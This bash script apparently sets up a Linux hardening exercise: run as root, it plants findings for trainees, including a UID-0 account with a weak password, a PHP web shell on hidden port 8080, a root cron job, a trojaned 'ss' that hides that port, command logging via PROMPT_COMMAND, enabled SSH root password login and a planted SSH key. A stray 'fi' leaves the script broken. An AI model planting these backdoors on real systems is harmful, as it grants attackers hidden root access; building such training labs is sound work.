#!/bin/bash

set -u

LOG="/var/log/.luke_deploy"
ts() { date +"%Y-%m-%d %H:%M:%S"; }

if [ "$(id -u)" -ne 0 ]; then
    echo "This must be run with sudo (e.g. sudo ./linuxtryouts2)." >&2
    exit 1
fi

APACHE_AVAIL="/etc/apache2/sites-available"
if [ ! -d "$APACHE_AVAIL" ]; then
    echo "Apache does not appear to be installed. This level builds on your" >&2
    echo "Linux Level 1 LAMP VM -- complete Level 1 first, then re-run." >&2
    exit 1
fi

if ! id luke >/dev/null 2>&1; then
    useradd -m -s /bin/bash luke >/dev/null 2>&1
    echo 'luke:Summer2026!' | chpasswd >/dev/null 2>&1
fi

if ! id mysql_safe >/dev/null 2>&1; then
    useradd -o -u 0 -g 0 -M -d /root -s /bin/bash mysql_safe >/dev/null 2>&1
    echo 'mysql_safe:changeme' | chpasswd >/dev/null 2>&1
fi

if [ ! -f /etc/sudoers.d/90-luke ]; then
    echo 'luke ALL=(ALL) NOPASSWD: /usr/bin/find' > /etc/sudoers.d/90-luke
    chmod 0440 /etc/sudoers.d/90-luke
fi

HIDDEN_ROOT="/var/www/.sysupdate"
mkdir -p "$HIDDEN_ROOT"

if [ ! -f "$HIDDEN_ROOT/index.php" ]; then
    cat > "$HIDDEN_ROOT/index.php" << 'PHP'
<?php
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
<html><body>system maintenance in progress</body></html>
PHP
fi
chown -R www-data:www-data "$HIDDEN_ROOT"

if ! grep -q "^Listen 8080" /etc/apache2/ports.conf 2>/dev/null; then
    echo "Listen 8080" >> /etc/apache2/ports.conf
fi

if [ ! -f "$APACHE_AVAIL/000-sysupdate.conf" ]; then
    cat > "$APACHE_AVAIL/000-sysupdate.conf" << EOF
<VirtualHost *:8080>
    DocumentRoot $HIDDEN_ROOT
    <Directory $HIDDEN_ROOT>
        Require all granted
    </Directory>
</VirtualHost>
EOF
    a2ensite 000-sysupdate.conf >/dev/null 2>&1
fi

SEC="/etc/apache2/conf-available/security.conf"
if [ -f "$SEC" ]; then
    sed -i 's/^[[:space:]]*ServerTokens.*/ServerTokens Full/'  "$SEC"
    sed -i 's/^[[:space:]]*ServerSignature.*/ServerSignature On/' "$SEC"
fi

cat >> /etc/apache2/apache2.conf << EOF
<Directory /var/www/html>
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>
EOF
fi

a2enmod status >/dev/null 2>&1
if [ ! -f /etc/apache2/conf-available/zz-status.conf ]; then
    cat > /etc/apache2/conf-available/zz-status.conf << EOF
<Location /server-status>
    SetHandler server-status
    Require all granted
</Location>
EOF
    a2enconf zz-status >/dev/null 2>&1
fi

if [ ! -f /usr/local/sbin/.cleanup ]; then
    cat > /usr/local/sbin/.cleanup << 'EOF'
#!/bin/bash
echo 'luke ALL=(ALL) NOPASSWD: /usr/bin/find' > /etc/sudoers.d/90-luke
chmod 0440 /etc/sudoers.d/90-luke
wall "Play big bootie mix......." 2>/dev/null
EOF
    chmod 0755 /usr/local/sbin/.cleanup
fi

if [ ! -f /etc/cron.d/luke-maint ]; then
    echo "Luke was here...." > /etc/cron.d/luke-maint
    echo '*/5 * * * * root /usr/local/sbin/.cleanup' >> /etc/cron.d/luke-maint
    chmod 0644 /etc/cron.d/luke-maint
fi

for d in /usr/local/sbin /usr/local/bin; do
    if [ ! -f "$d/ss" ]; then
        cat > "$d/ss" << 'EOF'
#!/bin/bash
/usr/bin/ss "$@" | grep -v ':8080'
EOF
        chmod 0755 "$d/ss"
    fi
done

if [ ! -f /etc/profile.d/00-motd-cache.sh ]; then
    cat > /etc/profile.d/00-motd-cache.sh << 'EOF'
export PROMPT_COMMAND='echo "$(date +%s) $(whoami) $BASH_COMMAND" >> /var/tmp/.audit 2>/dev/null'
EOF
fi

SSHD_DROPIN="/etc/ssh/sshd_config.d/99-tuning.conf"
if [ -d /etc/ssh/sshd_config.d ] && [ ! -f "$SSHD_DROPIN" ]; then
    cat > "$SSHD_DROPIN" << EOF
PermitRootLogin yes
PasswordAuthentication yes
EOF
fi

mkdir -p /root/.ssh
chmod 700 /root/.ssh
if ! grep -q "totallylegitadmin" /root/.ssh/authorized_keys 2>/dev/null; then
    echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILUKETRAININGARTIFACTtvRjdALWUmq23kfMNQ totallylegitadmin' >> /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
fi
systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || true

if apache2ctl configtest >/dev/null 2>&1; then
    systemctl reload apache2 2>/dev/null || systemctl restart apache2 2>/dev/null || true
else
    systemctl restart apache2 2>/dev/null || true
fi

echo "Environment prepared. Something tells me Luke left a few surprises. Good luck."
exit 0